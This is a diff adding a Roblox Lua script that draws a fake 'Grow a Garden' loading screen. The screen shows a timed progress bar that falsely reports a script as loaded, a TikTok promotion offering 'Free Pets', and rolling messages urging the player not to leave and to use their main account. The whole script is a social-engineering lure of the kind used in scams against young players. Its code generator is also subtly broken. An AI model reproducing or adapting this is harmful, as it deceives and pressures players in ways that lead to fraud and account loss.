@@ -1,0 +1,167 @@
+-- 🧠 Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+
+-- 🧍 Player
+local player = Players.LocalPlayer
+
+-- 🖼️ UI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GrowLoadingUI"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+-- 🌈 Background (Red ↔ Blue Color Animation)
+local bg = Instance.new("Frame", screenGui)
+bg.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- start red
+bg.Size = UDim2.new(1, 0, 1, 0)
+
+-- 🔥 Animate background color smoothly
+task.spawn(function()
+    while true do
+        TweenService:Create(bg, TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
+            BackgroundColor3 = Color3.fromRGB(0, 0, 255) -- blue
+        }):Play()
+        task.wait(3)
+
+        TweenService:Create(bg, TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
+            BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- red
+        }):Play()
+        task.wait(3)
+    end
+end)
+
+-- 🌸 Title
+local title = Instance.new("TextLabel", bg)
+title.Text = "[⏳] Grow a Garden 🌶️ "
+title.Font = Enum.Font.FredokaOne
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextStrokeTransparency = 0
+title.TextSize = 50
+title.BackgroundTransparency = 1
+title.Position = UDim2.new(0.5, -220, 0.18, 0)
+title.Size = UDim2.new(0, 440, 0, 65)
+
+-- ⏳ Status
+local status = Instance.new("TextLabel", bg)
+status.Text = "Script Initializing... Please Wait."
+status.Font = Enum.Font.FredokaOne
+status.TextColor3 = Color3.fromRGB(255, 255, 255)
+status.TextSize = 22
+status.BackgroundTransparency = 1
+status.Position = UDim2.new(0.5, -180, 0.33, 0)
+status.Size = UDim2.new(0, 360, 0, 30)
+
+-- 📊 Progress Bar Container
+local progressFrame = Instance.new("Frame", bg)
+progressFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+progressFrame.BorderSizePixel = 0
+progressFrame.Position = UDim2.new(0.5, -155, 0.45, 0)
+progressFrame.Size = UDim2.new(0, 310, 0, 32)
+progressFrame.BackgroundTransparency = 0.3
+progressFrame.ClipsDescendants = true
+
+local corner1 = Instance.new("UICorner", progressFrame)
+corner1.CornerRadius = UDim.new(0, 12)
+
+-- 📈 Fill Bar
+local progressBar = Instance.new("Frame", progressFrame)
+progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+progressBar.BorderSizePixel = 0
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+
+local corner2 = Instance.new("UICorner", progressBar)
+corner2.CornerRadius = UDim.new(0, 12)
+
+-- 📃 Percent Text
+local percentText = Instance.new("TextLabel", progressFrame)
+percentText.Text = "0.0%"
+percentText.Font = Enum.Font.FredokaOne
+percentText.TextColor3 = Color3.new(0, 0, 0)
+percentText.TextSize = 20
+percentText.BackgroundTransparency = 1
+percentText.Size = UDim2.new(1, 0, 1, 0)
+
+-- 🧩 Unique Code Generator
+local function generateCode()
+  local function randBlock()
+    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    local block = ""
+    for _ = 1, 4 do
+      block = block .. string.sub(chars, math.random(1, #chars), 1)
+    end
+    return block
+  end
+  return "COD3-" .. randBlock() .. "-" .. randBlock()
+end
+
+local generatedCode = generateCode()
+
+-- 🟪 Follow TikTok Text
+local tiktokText = Instance.new("TextLabel", bg)
+tiktokText.Text = "Follow mufasaxzc on TikTok Click The Bio And Join To Get Free Pets"
+tiktokText.Font = Enum.Font.FredokaOne
+tiktokText.TextColor3 = Color3.fromRGB(255, 255, 255)
+tiktokText.TextSize = 16
+tiktokText.BackgroundTransparency = 1
+tiktokText.Position = UDim2.new(0.5, -200, 0.57, 0)
+tiktokText.Size = UDim2.new(0, 400, 0, 20)
+
+-- 🧬 User Code Display
+local codeLabel = Instance.new("TextLabel", bg)
+codeLabel.Text = "Your Code: " .. generatedCode
+codeLabel.Font = Enum.Font.FredokaOne
+codeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+codeLabel.TextSize = 18
+codeLabel.BackgroundTransparency = 1
+codeLabel.Position = UDim2.new(0.5, -160, 0.6, 0)
+codeLabel.Size = UDim2.new(0, 320, 0, 24)
+
+-- 💬 Moving Warning Messages
+local movingText = Instance.new("TextLabel", bg)
+movingText.Text = ""
+movingText.Font = Enum.Font.FredokaOne
+movingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+movingText.TextSize = 24
+movingText.BackgroundTransparency = 1
+movingText.Position = UDim2.new(0.5, -300, 0.93, 0)
+movingText.Size = UDim2.new(0, 600, 0, 30)
+
+local movingMessages = {
+  "Hello User Don't Leave........",
+  "If you get stuck on 100% Don't leave.......",
+  "Use your main to avoid Stuck Bug.......",
+}
+
+task.spawn(function()
+  while true do
+    for _, msg in ipairs(movingMessages) do
+      for i = 1, #msg do
+        movingText.Text = string.sub(msg, 1, i)
+        task.wait(0.03)
+      end
+      task.wait(2)
+    end
+  end
+end)
+
+-- ⏲️ 1 Minute Progress
+task.spawn(function()
+  local totalTime = 60 -- 1 minute
+  local steps = 100
+  local delay = totalTime / steps
+
+  for i = 1, steps do
+    local percent = i / steps
+    progressBar.Size = UDim2.new(percent, 0, 1, 0)
+    percentText.Text = tostring(math.floor(percent * 1000) / 10) .. "%"
+    task.wait(delay)
+  end
+
+  progressBar.Size = UDim2.new(1, 0, 1, 0)
+  percentText.Text = "100.0%"
+  status.Text = "Done! Script Loaded Successfully."
+end)
